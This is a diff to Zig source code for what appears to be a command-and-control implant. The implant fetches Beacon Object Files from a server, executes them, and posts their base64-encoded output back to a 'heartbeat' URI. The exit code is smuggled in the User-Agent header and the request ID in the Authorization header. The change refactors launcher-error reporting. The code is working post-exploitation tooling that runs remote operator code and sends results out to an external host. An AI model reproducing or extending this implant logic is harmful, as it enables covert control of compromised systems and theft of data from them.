@@ -123,9 +123,10 @@ const State = struct {
 };
 
 const PendingBof = struct {
-    context: *bof.Context,
+    context: ?*bof.Context = null,
     request_id: []const u8,
-    is_persistent: bool,
+    is_persistent: bool = false,
+    launcher_error_code: i32 = 0,
 };
 
 fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
@@ -179,6 +180,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     errdefer if (!is_persistent) bof_object.release();
 
     var bof_context: ?*bof.Context = null;
+    errdefer if (bof_context) |context| context.release();
 
     if (std.mem.eql(u8, exec_mode, "inline")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
@@ -256,15 +258,12 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         if (std.mem.eql(u8, cmd_prefix, "bof")) {
             std.log.info("Executing bof: {s}", .{cmd_name});
 
-            receiveAndLaunchBof(allocator, state, root) catch {
-                var options = std.http.Client.FetchOptions{
-                    .location = .{ .uri = state.heartbeat_uri },
-                    .response_strategy = .none,
-                };
-                try options.headers.append("Authorization", request_id);
-                try options.headers.append("User-Agent", "1"); // error code
-                var result = try state.http_client.fetch(allocator, options);
-                defer result.deinit();
+            receiveAndLaunchBof(allocator, state, root) catch |err| {
+                try state.pending_bofs.append(.{
+                    .request_id = try allocator.dupe(u8, request_id),
+                    // TODO: Error codes may change in Zig, this is hacky.
+                    .launcher_error_code = @abs(@intFromError(err)) - 1000,
+                });
             };
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
@@ -281,44 +280,63 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     }
 }
 
+fn generateUserAgentString(allocator: std.mem.Allocator, bof_exit_code_or_launcher_error: i32) ![]const u8 {
+    return try std.fmt.allocPrint(allocator, "result:{d}", .{bof_exit_code_or_launcher_error});
+}
+
 fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
     var pending_bof_index: usize = 0;
     while (pending_bof_index != state.pending_bofs.items.len) {
         const pending_bof = state.pending_bofs.items[pending_bof_index];
 
-        if (pending_bof.context.isRunning()) {
+        if (pending_bof.context != null and pending_bof.context.?.isRunning()) {
             pending_bof_index += 1;
         } else {
-            const context = pending_bof.context;
+            const bof_exit_code_or_launcher_error: i32 = if (pending_bof.context) |context| @intCast(context.getExitCode()) else pending_bof.launcher_error_code;
 
-            if (context.getOutput()) |output| {
-                std.log.info("Bof output:\n{s}", .{output});
+            const result_str = try generateUserAgentString(allocator, bof_exit_code_or_launcher_error);
+            defer allocator.free(result_str);
 
-                const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
-                defer allocator.free(out_b64);
+            var headers = std.http.Headers.init(allocator);
+            defer headers.deinit();
+            try headers.append("Content-Type", "text/plain");
+            try headers.append("Authorization", pending_bof.request_id);
+            try headers.append("User-Agent", result_str);
 
-                _ = state.base64_encoder.encode(out_b64, output);
+            var request = try state.http_client.open(.POST, state.heartbeat_uri, headers, .{});
+            defer request.deinit();
 
-                var headers = std.http.Headers.init(allocator);
-                defer headers.deinit();
-                try headers.append("Content-Type", "text/plain");
-                try headers.append("Authorization", pending_bof.request_id);
+            if (pending_bof.context) |context| {
+                if (context.getOutput()) |output| {
+                    std.log.info("Bof output:\n{s}", .{output});
 
-                var request = try state.http_client.open(.POST, state.heartbeat_uri, headers, .{});
-                defer request.deinit();
-                request.transfer_encoding = .{ .content_length = out_b64.len };
+                    const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
+                    defer allocator.free(out_b64);
 
+                    _ = state.base64_encoder.encode(out_b64, output);
+
+                    request.transfer_encoding = .{ .content_length = out_b64.len };
+
+                    try request.send(.{});
+                    try request.writeAll(out_b64);
+                    try request.finish();
+                } else {
+                    // BOF hasn't generated any output, just send the result (always positive or zero) in http headers
+                    try request.send(.{});
+                }
+
+                if (!pending_bof.is_persistent)
+                    context.getObject().release();
+
+                context.release();
+            } else {
+                // `context` is null which means that there was an error when launching BOF
+                // just send launcher error code (always negative) in http headers
                 try request.send(.{});
-                try request.writeAll(out_b64);
-                try request.finish();
             }
+            try request.wait();
 
-            if (!pending_bof.is_persistent)
-                context.getObject().release();
-
-            context.release();
             allocator.free(pending_bof.request_id);
-
             _ = state.pending_bofs.swapRemove(pending_bof_index);
         }
     }
